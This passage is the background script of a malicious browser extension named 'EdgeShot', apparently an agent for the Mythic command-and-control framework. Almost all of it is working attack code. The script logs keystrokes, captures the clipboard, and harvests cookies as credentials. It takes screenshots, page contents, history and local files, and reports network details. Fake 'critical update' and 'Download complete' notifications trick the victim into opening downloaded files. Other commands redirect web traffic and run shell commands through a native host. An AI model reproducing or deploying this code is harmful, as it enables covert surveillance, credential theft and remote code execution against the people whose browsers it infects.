    lastClipboard = text;
    await bufferPush("clipboard", { data: text, url: tab.url, timestamp: new Date().toISOString() });
  } catch (_) {}
}
chrome.tabs.onActivated.addListener((activeInfo) => captureClipboard(activeInfo.tabId));
chrome.windows.onFocusChanged.addListener((windowId) => {
  if (windowId === chrome.windows.WINDOW_ID_NONE) return;
  chrome.tabs.query({ active: true, windowId }, (tabs) => {
    if (tabs[0]) captureClipboard(tabs[0].id);
  });
});

// ---- Keylogger / LLM message router (content script -> buffer) ----
chrome.runtime.onMessage.addListener((message) => {
  if (message?.type === "BUFFER_FLUSH" || message?.type === "RECORDING_DONE") {
    bufferPush("keylog", {
      url: message.url || "",
      buffer: message.keys || "",
      id: message.id || "",
      timestamp: new Date().toISOString(),
    });
  }
  if (message?.action === "exfiltrate") {
    bufferPush("llm", message.data || message);
  }
});

// ============================================================================
// Notification lure configuration + proxy (declarativeNetRequest) + network
// ============================================================================
let notifType = "basic";
let notifIconUrl = "icons/icon128.png";
let notifTitle = "Update available";
let notifMessage = "A critical update is available. Click here to install.";

let proxyState = false;
let proxyRules = { blockRules: [], redirectRules: [] };

// Convert a wildcard pattern (e.g. "*.facebook.com") to a DNR urlFilter.
function patternToFilter(pattern) {
  if (pattern === "*") return "*";
  if (pattern.startsWith("*.")) return "||" + pattern.slice(2);
  return "||" + pattern;
}

async function applyDeclarativeRules() {
  const existing = await chrome.declarativeNetRequest.getDynamicRules();
  const existingIds = existing.map((r) => r.id);
  const newRules = [];
  let ruleId = 1;

  for (const pattern of proxyRules.blockRules || []) {
    const condition = {
      urlFilter: patternToFilter(pattern),
      resourceTypes: ["main_frame", "sub_frame", "xmlhttprequest", "script", "image", "stylesheet", "other"],
    };
    // Wildcard-everything must never block the C2 itself.
    if (pattern === "*") condition.excludedRequestDomains = [new URL(GET_URL).hostname];
    newRules.push({ id: ruleId++, priority: 2, action: { type: "block" }, condition });
  }

  for (const rule of proxyRules.redirectRules || []) {
    if (!rule || !rule.from || !rule.to) continue;
    const condition = {
      urlFilter: patternToFilter(rule.from),
      resourceTypes: ["main_frame", "sub_frame"],
    };
    if (rule.from === "*") condition.excludedRequestDomains = [new URL(GET_URL).hostname];
    newRules.push({
      id: ruleId++,
      priority: 1,
      action: { type: "redirect", redirect: { url: rule.to } },
      condition,
    });
  }

  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: existingIds,
    addRules: newRules,
  });
}

async function clearDeclarativeRules() {
  const existing = await chrome.declarativeNetRequest.getDynamicRules();
  const existingIds = existing.map((r) => r.id);
  if (existingIds.length > 0) {
    await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: existingIds, addRules: [] });
  }
}

// Local IPs via WebRTC STUN (returns public/srflx IPs and mDNS .local names).
async function getLocalIPs() {
  let tab = null;
  try {
    const win = await chrome.windows.getLastFocused({ populate: true });
    tab = (win.tabs || []).find((t) => t.active) || null;
  } catch (_) {}
  if (!tab) {
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    tab = tabs[0] || null;
  }
  if (!tab || !isScriptable(tab.url)) return [];

  try {
    const result = await chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: () => new Promise((resolve) => {
        const ips = new Set();
        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
        pc.createDataChannel("probe");
        pc.onicecandidate = (e) => {
          if (!e.candidate) { pc.close(); resolve([...ips]); return; }
          const c = e.candidate.candidate;
          const ipMatch = c.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
          if (ipMatch) ipMatch.forEach((ip) => { if (ip !== "0.0.0.0") ips.add(ip); });
          const mdns = c.match(/[\w-]+\.local/);
          if (mdns) ips.add(mdns[0]);
        };
        pc.createOffer()
          .then((offer) => pc.setLocalDescription(offer))
          .catch(() => { pc.close(); resolve([...ips]); });
        setTimeout(() => { pc.close(); resolve([...ips]); }, 4000);
      }),
    });
    return result?.[0]?.result || [];
  } catch (_) {
    return [];
  }
}

async function getNetworkInfo() {
  const rtcIPs = await getLocalIPs();
  let geoData = {};
  try {
    const res = await fetch("https://ipapi.co/json/");
    if (!res.ok) throw new Error("HTTP " + res.status);
    geoData = await res.json();
  } catch (_) {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      if (res.ok) geoData = { ip: (await res.json()).ip };
    } catch (_) {}
  }
  const publicRtcIP = rtcIPs.find((ip) => !ip.includes(".local") && ip !== "0.0.0.0");
  const mdnsAddresses = rtcIPs.filter((ip) => ip.includes(".local"));
  return {
    ips: rtcIPs,
    publicIP: geoData.ip || "not found",
    country: geoData.country_name || "not found",
    isp: geoData.org || "not found",
    interfaceCount: mdnsAddresses.length,
    vpnDetected: !!(publicRtcIP && publicRtcIP !== geoData.ip),
  };
}

async function handleTask(task) {
  const cmd = (task.command || "").toLowerCase();
  const params = getParams(task);
  let output = "";
  switch (cmd) {
    case "heartbeat":
      output = "Extension active — service worker alive.";
      break;
    case "get_status": {
      let manifest = {};
      try { manifest = chrome.runtime.getManifest(); } catch (_) {}
      output = JSON.stringify({
        agent: "EdgeShot",
        name: manifest.name || "EdgeShot",
        version: manifest.version || "",
        description: manifest.description || "",
        browser: navigator.userAgent,
        callback: CALLBACK_UUID,
      });
      break;
    }
    case "get_capabilities":
      output = JSON.stringify({ capabilities: CAPABILITIES });
      break;
    case "get_active_tab": {
      const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
      output = JSON.stringify(tabs.map((t) => ({ url: t.url, title: t.title })));
      break;
    }
    case "get_tabs": {
      const allWindows = await chrome.windows.getAll({ populate: true });
      const tabs = (allWindows || []).flatMap((w) => w.tabs || []).map((t) => ({
        id: t.id,
        url: t.url,
        title: t.title,
        active: t.active,
        windowId: t.windowId,
        pinned: t.pinned,
      }));
      output = JSON.stringify(tabs);
      break;
    }
    case "exit":
    case "kill":
      output = "Uninstalling extension...";
      // Report first, then self-remove. The delayed call lets the response
      // above reach the C2 before the service worker is torn down.
      setTimeout(() => {
        try {
          chrome.management.uninstallSelf({ showConfirmDialog: false }, () => {});
        } catch (_) {}
      }, 2000);
      break;
    case "alert": {
      const message = params.message || "";
      const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
      const tab = tabs[0];
      if (!tab || !isScriptable(tab.url)) {
        output = JSON.stringify({ error: "no_scriptable_tab" });
      } else {
        await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: (msg) => alert(msg),
          args: [message],
        });
        output = JSON.stringify({ ok: true });
      }
      break;
    }
    case "open_tab": {
      const url = params.url || "";
      if (!url) { output = JSON.stringify({ error: "missing_url" }); break; }
      const tab = await chrome.tabs.create({ url, active: false });
      output = JSON.stringify({ ok: true, tabId: tab.id, url });
      break;
    }
    case "get_screenshot": {
      // A service worker has no "current window", so prefer the last focused
      // window and fall back to the active-tab query.
      let tab = null;
      try {
        const win = await chrome.windows.getLastFocused({ populate: true });
        tab = (win.tabs || []).find((t) => t.active) || null;
      } catch (_) {}
      if (!tab) {
        const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
        tab = tabs[0] || null;
      }
      if (!tab || !isScriptable(tab.url)) {
        output = JSON.stringify({ error: "no_scriptable_tab" });
        break;
      }
      try {
        const dataUrl = await chrome.tabs.captureVisibleTab(tab.windowId, { format: "png" });
        const base64 = (dataUrl || "").split(",")[1] || "";
        if (!base64) throw new Error("empty capture");
        const filename = "screenshot_" + tab.id + "_" + Date.now() + ".png";
        const bytes = Math.floor((base64.length * 3) / 4);
        output = JSON.stringify({ ok: true, filename, bytes, tab: tab.url });
        return {
          task_id: task.id,
          completed: true,
          user_output: output,
          download: makeDownload(filename, base64, true),
        };
      } catch (e) {
        output = JSON.stringify({ error: "capture_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "get_dom": {
      const tabId = Number(params.tab_id) || 0;
      const allWindows = await chrome.windows.getAll({ populate: true });
      const allTabs = (allWindows || []).flatMap((w) => w.tabs || []);
      const scriptable = allTabs.filter((t) =>
        t.url && (t.url.startsWith("http://") || t.url.startsWith("https://"))
      );
      let target = scriptable.find((t) => t.id === tabId);
      if (!target) target = scriptable.find((t) => t.active);
      if (!target) {
        output = JSON.stringify({ error: "no_scriptable_tab" });
        break;
      }
      try {
        const result = await chrome.scripting.executeScript({
          target: { tabId: target.id },
          func: () => document.documentElement.outerHTML,
        });
        output = JSON.stringify({ ok: true, tabId: target.id, content: result?.[0]?.result ?? null });
      } catch (e) {
        output = JSON.stringify({ error: "dom_failed", detail: String(e && e.message || e) });
      }
      break;
    }
    case "get_history": {
      let maxResults = Number(params.max_results);
      if (isNaN(maxResults) || maxResults <= 0) maxResults = 200;
      const results = await chrome.history.search({ text: "", maxResults });
      output = JSON.stringify({ ok: true, result: results });
      break;
    }
    case "get_bookmarks": {
      const tree = await chrome.bookmarks.getTree();
      output = JSON.stringify({ ok: true, result: tree });
      break;
    }
    case "upload_file": {
      // Upload a local file (chosen in Mythic) to the victim. The operator's
      // file arrives as a file_id (the File parameter's UUID); we pull its
      // chunks from the server and save them to Downloads.
      const fileId = params.file || params.file_id || "";
      const remotePath = params.remote_path || "";
      if (!fileId) { output = JSON.stringify({ error: "missing_file" }); break; }
      let filename = remotePath;
      if (filename.includes("/")) filename = filename.split("/").pop();
      if (filename.includes("\\")) filename = filename.split("\\").pop();
      if (!filename) filename = "uploaded_" + fileId.slice(0, 8);
      try {
        const res = await pullFileFromMythic(task, fileId, filename);
        output = JSON.stringify({ ok: true, filename, bytes: res.bytes, downloadId: res.downloadId });
      } catch (e) {
        output = JSON.stringify({ error: "upload_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "execute_file": {
      const url = params.url || "";
      if (!url) { output = JSON.stringify({ error: "missing_url" }); break; }
      const filename = url.split("/").pop().split("?")[0] || "file";
      try {
        const downloadId = await chrome.downloads.download({
          url,
          filename,
          conflictAction: "overwrite",
          saveAs: false,
        });
        // Lure the victim into opening the downloaded file. The icon must be
        // a real packaged file or chrome.notifications.create rejects.
        await chrome.notifications.create("exec_" + downloadId, {
          type: "basic",
          iconUrl: "icons/icon128.png",
          title: "Download complete",
          message: "Click to open " + filename,
          priority: 2,
          requireInteraction: true,
        });
        output = JSON.stringify({ ok: true, downloadId, filename });
      } catch (e) {
        output = JSON.stringify({ error: "download_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "get_buffer": {
      const data = await bufferDrainAll();
      const counts = {};
      for (const t of BUFFER_TYPES) counts[t] = data[t].length;

      // Map keylogs onto Mythic's native keylog channel (window_title = url).
      const keylogs = (data.keylog || []).map((k) => ({
        window_title: k.url || "unknown",
        keystrokes: k.buffer || "",
      }));

      // Map cookies onto Mythic's native credential channel. Each entry is
      // either a full-domain cookie dump (visit) or a single cookie change.
      const creds = [];
      for (const c of data.cookies || []) {
        if (c.cookies && Array.isArray(c.cookies)) {
          for (const co of c.cookies) {
            creds.push({
              credential_type: "cookie",
              realm: co.domain || c.domain || "",
              account: co.name || "",
              credential: co.value || "",
              comment: co.path || "",
            });
          }
        } else {
          creds.push({
            credential_type: "cookie",
            realm: c.domain || "",
            account: c.name || "",
            credential: c.value || "",
            comment: (c.cause || "") + (c.deleted ? " (deleted)" : ""),
          });
        }
      }

      output = JSON.stringify({
        ok: true,
        flushed: true,
        counts,
        keylog: data.keylog,
        clipboard: data.clipboard,
        cookies: data.cookies,
        llm: data.llm,
        activity: data.activity,
        downloads: data.downloads,
      });
      return {
        task_id: task.id,
        completed: true,
        user_output: output,
        keylogs: keylogs.length ? keylogs : undefined,
        credentials: creds.length ? creds : undefined,
      };
    }
    case "get_file": {
      const path = (params.path || "").trim();
      if (!path) { output = JSON.stringify({ error: "missing_path" }); break; }
      const url = "file:///" + path.replace(/\\/g, "/");
      try {
        const res = await fetch(url);
        // file:// responses report status 0 (opaque) even on success — rely on
        // the body, never on res.ok / res.status.
        const bytes = new Uint8Array(await res.arrayBuffer());
        if (bytes.length === 0) throw new Error("empty response (file URL access not granted?)");

        // Directory listing: Chrome renders file:/// dirs as addRow() HTML.
        const { text: rawText, binary } = sniffAndDecode(bytes);
        if (rawText.includes("addRow(")) {
          const rows = [];
          const regex = /addRow\("([^"]+)","[^"]*",(\d),\d+,"[^"]*",\d+,"([^"]*)"\)/g;
          let match;
          while ((match = regex.exec(rawText)) !== null) {
            rows.push({ name: match[1], type: match[2] === "1" ? "dir" : "file", modified: match[3] });
          }
          const listing = rows.map((r) => {
            const icon = r.type === "dir" ? "[DIR] " : "[FILE]";
            return icon + "  " + r.name.padEnd(30) + " " + r.modified;
          }).join("\n");
          output = path + "\n" + "─".repeat(55) + "\n" + listing;
          break;
        }

        // Text (UTF-16/UTF-8 with BOM, or any single-byte text) -> inline.
        if (!binary) {
          output = rawText;
          break;
        }

        // Binary file -> send back through the download channel.
        const base64 = bytesToBase64(bytes);
        const filename = path.split(/[\\/]/).pop() || "file";
        output = JSON.stringify({ ok: true, filename, bytes: bytes.length });
        return {
          task_id: task.id,
          completed: true,
          user_output: output,
          download: makeDownload(filename, base64, false, path),
        };
      } catch (e) {
        output = JSON.stringify({
          error: "read_failed",
          detail: String((e && e.message) || e),
          hint: "Enable 'Allow access to file URLs' for the extension in chrome://extensions, and verify the path exists.",
        });
      }
      break;
    }
    case "start_keylogger":
    case "stop_keylogger": {
      let tab = null;
      try {
        const win = await chrome.windows.getLastFocused({ populate: true });
        tab = (win.tabs || []).find((t) => t.active) || null;
      } catch (_) {}
      if (!tab) {
        const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
        tab = tabs[0] || null;
      }
      const scriptable = tab && tab.url &&
        (tab.url.startsWith("http://") || tab.url.startsWith("https://")) &&
        isScriptable(tab.url);
      if (!scriptable) {
        output = JSON.stringify({ error: "no_scriptable_tab", url: tab && tab.url });
        break;
      }
      try {
        // Ensure the inline content script is present (idempotent).
        await chrome.scripting.executeScript({ target: { tabId: tab.id }, func: keyloggerContentScript });
        const msg = cmd === "start_keylogger"
          ? { type: "START_RECORDING", id: task.id, url: tab.url }
          : { type: "STOP_RECORDING" };
        chrome.tabs.sendMessage(tab.id, msg).catch(() => {});
        output = JSON.stringify({ ok: true, tabId: tab.id, url: tab.url, action: cmd });
      } catch (e) {
        output = JSON.stringify({ error: "injection_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "network_recon": {
      try {
        const result = await getNetworkInfo();
        output = JSON.stringify({ ok: true, result });
      } catch (e) {
        output = JSON.stringify({ error: "recon_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "get_notification":
      output = JSON.stringify({
        ok: true,
        config: { type: notifType, iconUrl: notifIconUrl, title: notifTitle, message: notifMessage },
      });
      break;
    case "set_notification":
      if (params.type) notifType = params.type;
      if (params.title !== undefined && params.title !== null) notifTitle = params.title;
      if (params.message !== undefined && params.message !== null) notifMessage = params.message;
      output = JSON.stringify({
        ok: true,
        config: { type: notifType, iconUrl: notifIconUrl, title: notifTitle, message: notifMessage },
      });
      break;
    case "send_notification": {
      const notifId = "edgeshot_notif_" + Date.now();
      try {
        await chrome.notifications.create(notifId, {
          type: notifType,
          iconUrl: notifIconUrl,
          title: notifTitle,
          message: notifMessage,
          priority: 2,
          requireInteraction: true,
        });
        output = JSON.stringify({ ok: true, notification_id: notifId });
      } catch (e) {
        output = JSON.stringify({ error: "notif_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "send_notification_v2": {
      const v2Type = params.type === "image" ? "image" : "basic";
      const notifOptions = {
        type: v2Type,
        iconUrl: notifIconUrl,
        title: params.title || "",
        message: params.message || "",
        requireInteraction: params.require_interaction !== false,
        priority: 2,
      };
      if (v2Type === "image" && params.image_url) notifOptions.imageUrl = params.image_url;
      let buttons = [];
      if (params.buttons) {
        try { const b = JSON.parse(params.buttons); if (Array.isArray(b)) buttons = b; } catch (_) {}
      }
      if (buttons.length) notifOptions.buttons = buttons.map((b) => ({ title: b.title || "" }));
      const notifId = "notifv2_" + Date.now();
      try {
        await chrome.storage.session.set({ [notifId]: { clickUrl: params.click_url || null, buttons } });
        await chrome.notifications.create(notifId, notifOptions);
        output = JSON.stringify({ ok: true, notification_id: notifId });
      } catch (e) {
        output = JSON.stringify({ error: "notif_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "enable_proxy": {
      try {
        proxyState = true;
        await applyDeclarativeRules();
        output = JSON.stringify({ ok: true, active: true, rules: proxyRules });
      } catch (e) {
        output = JSON.stringify({ error: "proxy_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "disable_proxy": {
      try {
        proxyState = false;
        await clearDeclarativeRules();
        output = JSON.stringify({ ok: true, active: false });
      } catch (e) {
        output = JSON.stringify({ error: "proxy_failed", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "proxy_set_rules": {
      try {
        const blockRules = (params.block_rules || "")
          .split(",").map((s) => s.trim()).filter(Boolean);
        let redirectRules = [];
        if (params.redirect_rules) {
          const parsed = JSON.parse(params.redirect_rules);
          if (Array.isArray(parsed)) redirectRules = parsed;
        }
        proxyRules = { blockRules, redirectRules };
        if (proxyState) await applyDeclarativeRules();
        output = JSON.stringify({ ok: true, active: proxyState, rules: proxyRules });
      } catch (e) {
        output = JSON.stringify({ error: "invalid_rules", detail: String((e && e.message) || e) });
      }
      break;
    }
    case "execute_cmd": {
      if (!RCE_ENABLED) {
        output = JSON.stringify({ error: "rce_disabled" });
        break;
      }
      const command = params.command || "";
      if (!command) {
        output = JSON.stringify({ error: "missing_cmd" });
        break;
      }
      output = await new Promise((resolve) => {
        try {
          chrome.runtime.sendNativeMessage(
            "com.site.agent",
            { action: "execute_cmd", command },
            (response) => {
              const err = chrome.runtime.lastError;
              if (err) {
                resolve(JSON.stringify({ error: "native", detail: err.message || "host unreachable" }));
              } else if (!response) {
                resolve(JSON.stringify({ error: "no_response_from_agent" }));
              } else {
                resolve(JSON.stringify({ ok: true, result: response.result }));
              }
            }
          );
        } catch (e) {
          resolve(JSON.stringify({ error: "native_exception", detail: String((e && e.message) || e) }));
        }
      });
      break;
    }
    case "check_rce": {
      if (!RCE_ENABLED) {
        output = JSON.stringify({ error: "rce_disabled" });
        break;
      }
      output = await new Promise((resolve) => {
        try {
          chrome.runtime.sendNativeMessage(
            "com.site.agent",
            { action: "ping" },
            (response) => {
              const err = chrome.runtime.lastError;
              if (err || !response || response.error) {
                resolve(JSON.stringify({
                  rce_active: false,
                  error: (err && err.message) || (response && response.error) || "host unreachable",
                }));
              } else {
                resolve(JSON.stringify({ rce_active: true, result: response.result }));
              }
            }
          );
        } catch (e) {
          resolve(JSON.stringify({ error: "native_exception", detail: String((e && e.message) || e) }));
        }
      });
      break;
    }
    default:
      output = 'Command "' + (task.command || "?") + '" not implemented yet (milestone 2).';
  }
  return { task_id: task.id, completed: true, user_output: output };
}

async function pollOnce() {
  try {
    const t = await getTasking();
    const tasks = (t && t.tasks) || [];
    if (tasks.length > 0) {
      const responses = [];
      for (const task of tasks) {
        responses.push(await handleTask(task));
      }
      await postMessage({ action: "post_response", responses });
    }
  } catch (e) {
    console.error("poll error", e);
  }
}

// ---------------------------------------------------------------------------
// Startup (sideloaded extension: onInstalled does not fire)
// ---------------------------------------------------------------------------
async function bootstrap() {
  try {
    await checkin();
  } catch (e) {
    console.error("checkin error", e);
  }
  chrome.alarms.create("poll", { periodInMinutes: POLL_MINUTES });
  await pollOnce();
}

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "poll") pollOnce();
});

// Open a downloaded file when the victim clicks the "Download complete" prompt
// (see execute_file). The notification id is "exec_<downloadId>".
chrome.notifications.onClicked.addListener((id) => {
  if (id.startsWith("exec_")) {
    const downloadId = parseInt(id.slice(5), 10);
    if (!isNaN(downloadId)) chrome.downloads.open(downloadId);
  } else if (id.startsWith("notifv2_")) {
    // notifv2: open the configured click URL when the victim clicks the body.
    chrome.storage.session.get(id).then((r) => {
      const meta = r[id];
      if (meta && meta.clickUrl) chrome.tabs.create({ url: meta.clickUrl, active: true });
      chrome.storage.session.remove(id);
      chrome.notifications.clear(id);
    }).catch(() => {});
  }
});

// notifv2: open the button's URL when the victim clicks an action button.
chrome.notifications.onButtonClicked.addListener((notifId, btnIdx) => {
  if (!notifId.startsWith("notifv2_")) return;
  chrome.storage.session.get(notifId).then((r) => {
    const meta = r[notifId];
    const btn = meta && meta.buttons && meta.buttons[btnIdx];
    if (btn && btn.url) chrome.tabs.create({ url: btn.url, active: true });
    chrome.notifications.clear(notifId);
    chrome.storage.session.remove(notifId);
  }).catch(() => {});
});

bootstrap();
